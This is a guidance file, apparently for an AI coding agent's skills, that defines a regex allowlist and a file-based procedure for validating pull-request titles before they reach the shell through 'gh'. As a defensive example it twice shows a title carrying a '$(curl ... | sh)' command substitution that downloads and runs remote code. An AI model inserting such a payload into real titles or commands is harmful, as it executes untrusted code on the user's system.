# PR Title Allowlist

`gh` has no `--title-file`, so a composed PR title always reaches the shell inside a
double-quoted argument. Validate it here before it does.

## Step 1: refuse any title containing a line break

Check this first and separately. A title holding `\n` or `\r` is refused outright, whatever
else it contains. The anchored pattern in Step 2 does not cover it: `grep` is line-oriented and
matches any single line.

## Step 2: match the whole string against the pattern

```
^(\[[A-Z][A-Z0-9]{1,9}-[0-9]{1,7}\] )?[a-z][a-z0-9-]*(\([a-z0-9._/-]+\))?: []A-Za-z0-9 ,.:'()/_+&#@%~=—[-]+$
```

The match must be **whole-string and single-line**. Two implementations, which agree on every
single-line title in a UTF-8 locale:

- **Python:** `re.fullmatch(pattern_without_anchors, title)`
- **`grep`:** `grep -qxEf <pattern-file> <title-file>` — both operands as files, for the reason
  in the next section. Keep `-x`: it is what makes the match whole-line, and it is also what
  stops a stray blank line in the pattern file from matching everything.

**Probe three titles before trusting the check.** `[PM-1] feat: handle passkey autofill` must be
accepted; `feat: x $(id)` must be refused; and a two-line file whose first line is a valid title
must be refused, which exercises the line count rather than the pattern. The two refusals catch
anything that made the check more permissive, the class that otherwise looks like the control
working. Every other defect here fails closed and shows up as the accept probe rejecting a
legitimate title.

Require a UTF-8 locale for the `grep` path. Under `LC_ALL=C` it splits the em dash into bytes
and will admit a stray continuation byte. Neither byte is a shell metacharacter, so this is a
correctness gap rather than a bypass, but the check stops being equivalent to the Python one.

## Getting the title into the check

**Never build a shell variable to hold the title.** A bash assignment expands `$(…)` while
parsing, so the payload runs before any check sees it and the allowlist then passes the
residue:

```bash
title="[PM-31007] feat: handle $(curl -s https://x/y|sh) tokens"   # already executed
printf '%s' "$title" | grep -qxEf pat.txt                          # verdict: accept
```

That would make validation the first place the title reaches a shell, which is the opposite of
the point. Quoting does not save it either: the pattern deliberately admits `'`, so a
single-quoted form breaks on a legitimate title like `fix(auth): don't crash`.

Instead, keep the title out of the shell entirely:

1. Write the title to a file with the **Write tool**, not a heredoc or `echo`.
2. Run Step 1 as a line count: `awk 'END { exit NR != 1 }' <title-file>`. Only the count enters
   the shell, never the title. Refuse on a non-zero exit, which also covers an empty or missing
   file. `NR` splits on `\n`, so a lone `\r` passes this and is refused by the pattern instead;
   `\r` is not in the summary class.
3. Check the pattern with both operands as files: `grep -qxEf <pattern-file> <title-file>`.
4. Hand it to `gh` as `--title "$(cat <title-file>)"`. Command-substitution output is not
   re-parsed, so a `$(…)` sequence surviving in the text is passed through as characters.

The Python path has no equivalent hazard: pass the string directly to `re.fullmatch`.

Read the summary character class carefully before editing it. Two positions in it are load
bearing:

- **`]` comes first** and **`[` sits just before the trailing `-`**, because a POSIX bracket
  expression has no escapes. `\[` and `\]` inside `[…]` are a literal backslash plus a bracket,
  which terminates the class early and silently turns the rest into a required literal suffix. A
  pattern written with those escapes tests fine in Python and then refuses every legitimate
  title under `grep`.
- **Nothing may directly follow the member `[` except the closing `-`.** A `[` immediately
  before `=`, `:`, or `.` opens a POSIX equivalence, character, or collating class and `grep`
  exits 2 with `invalid collating element`. That is why `[` sits second-to-last. (`%=`
  adjacency, by contrast, is harmless — the `~` between them is incidental.)

Pass the pattern to `grep` with `-f` rather than as an argument. It contains a single quote, so
`grep -qxE '<pattern>'` is a shell syntax error, and the escaping needed to inline it is its own
source of the bug above.

`re.search` with `^…$`, and any `grep` without `-x`, are both wrong here. And `-x` is not a
substitute for the line-break check: it constrains each match to a whole line, not how many
lines the file holds, and `-q` exits 0 on the first line that matches. The `awk` line count in
the sequence above is what enforces Step 1.

## Why it covers the summary

The summary is the model-generated part, so a check that pins only the type prefix still passes
`[PM-31007] feat: handle $(curl -s https://x/y|sh) tokens` and then executes it. Rejecting `$`,
backtick, `\`, and `"` is a useful second pass, but it is a denylist and it only holds for the
double-quoted style above: a single-quoted composition reopens it via `'`.

## What is deliberately permissive

This is a shell-safety control, not a conventions check. A false refusal blocks a submission
that nothing else can unblock, and it lands after the user has already confirmed a preview.
So:

- **The ticket-key bracket is optional**, and its project prefix is any `ABC-123` shape. The key
  is repository data rather than something to reword.
- **The type token is any lowercase keyword**, not a fixed list. `change-type-labels.md` points
  at `.github/label-pr.json` for the full CI mapping and notes it accepts further aliases, so a
  closed list here would refuse titles CI accepts. Whether the type is _right_ is settled by
  `Skill(applying-pr-conventions)`.
- **The summary class admits inert punctuation** — `&`, `#`, `+`, `@`, `%`, `=`, `~`, `[`, `]`, and
  the em dash this house style uses. None of them do anything inside a double-quoted argument, so
  excluding them only produces false refusals. `@` and `%` are not optional in practice: a scoped
  npm package (`bump @bitwarden/sdk-internal`) and a percentage (`40% faster vault unlock`) are
  ordinary subjects for a `deps` or `perf` title.

## On a refusal

Report the title that failed and which step rejected it. Do not strip characters and retry
silently: a title that needed rewriting to clear a shell-safety check is worth a human look.

## Who uses this

- `Skill(creating-pull-request)` — before `gh pr create` on a single branch.
- `Skill(force-multiplier)` — before `gh pr create` on every fan-out target.
- `Skill(applying-pr-conventions)` — composes the title but does not run these checks. It holds
  no `Bash` grant, since its contract is compose-and-return; it names this file to its caller
  instead. Whoever submits runs the checks.
